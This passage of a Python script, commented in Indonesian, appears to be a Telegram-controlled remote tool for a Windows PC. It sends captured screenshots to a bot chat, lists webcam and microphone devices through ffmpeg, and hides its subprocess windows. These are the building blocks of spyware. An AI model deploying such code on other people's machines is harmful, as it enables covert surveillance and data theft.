# ========== FUNGSI UTAMA ==========
def ensure_temp_dir():
    Path(TEMP_DIR).mkdir(parents=True, exist_ok=True)


def is_allowed_user(update: Update) -> bool:
    try:
        return str(update.effective_user.id) in ALLOWED_CHAT_IDS
    except Exception:
        return False


def telegram_target(chat_id=None) -> str:
    cid = str(chat_id).strip() if chat_id is not None else ALLOWED_CHAT_ID
    return cid if cid in ALLOWED_CHAT_IDS else ALLOWED_CHAT_ID


def send_telegram_message(text, chat_id=None, parse_mode=None):
    target = telegram_target(chat_id)
    if not target:
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": target, "text": str(text)}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        response = requests.post(url, data=payload, timeout=15)
        if response.status_code != 200:
            LOGGER.warning("Telegram sendMessage failed: %s %s", response.status_code, response.text[:300])
        return response.status_code == 200
    except Exception:
        LOGGER.exception("Telegram sendMessage error")
        return False


def send_telegram_file(file_path, caption=None, chat_id=None):
    target = telegram_target(chat_id)
    path = Path(file_path)
    if not target or not path.is_file():
        return False
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with path.open("rb") as file_obj:
            files = {"document": (path.name, file_obj)}
            data = {"chat_id": target}
            if caption:
                data["caption"] = str(caption)[:1024]
            response = requests.post(url, files=files, data=data, timeout=120)
        if response.status_code != 200:
            LOGGER.warning("Telegram sendDocument failed: %s %s", response.status_code, response.text[:300])
        return response.status_code == 200
    except Exception as exc:
        LOGGER.exception("Failed to send file %s", path)
        send_telegram_message(f"❌ Gagal kirim file {path.name}: {exc}", target)
        return False


def capture_screenshot_file(output=None):
    ensure_temp_dir()
    output = str(output or (Path(TEMP_DIR) / f"screenshot_{int(time.time())}.jpg"))
    try:
        image = ImageGrab.grab(all_screens=True)
        image.convert("RGB").save(output, "JPEG", quality=88, optimize=True)
        return output
    except Exception:
        LOGGER.exception("Pillow screenshot failed")
        if NIRCMD_PATH and Path(NIRCMD_PATH).exists():
            subprocess.run([NIRCMD_PATH, "savescreenshot", output], check=True,
                           creationflags=CREATE_NO_WINDOW, timeout=30)
            return output
        raise


def take_screenshot(chat_id=None):
    try:
        output = capture_screenshot_file()
        return send_telegram_file(output, "📷 Screenshot", chat_id=chat_id)
    except Exception as exc:
        LOGGER.exception("Screenshot failed")
        return send_telegram_message(f"❌ Gagal mengambil screenshot: {exc}", chat_id)


def _ffmpeg_devices():
    if not FFMPEG_PATH:
        return {"video": [], "audio": []}
    try:
        result = subprocess.run(
            [FFMPEG_PATH, "-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"],
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, encoding="utf-8", errors="replace",
            creationflags=CREATE_NO_WINDOW, timeout=20
        )
        sections = {"video": [], "audio": []}
        current = None
        for raw in result.stderr.splitlines():
            line = raw.strip()
            if "DirectShow video devices" in line:
                current = "video"
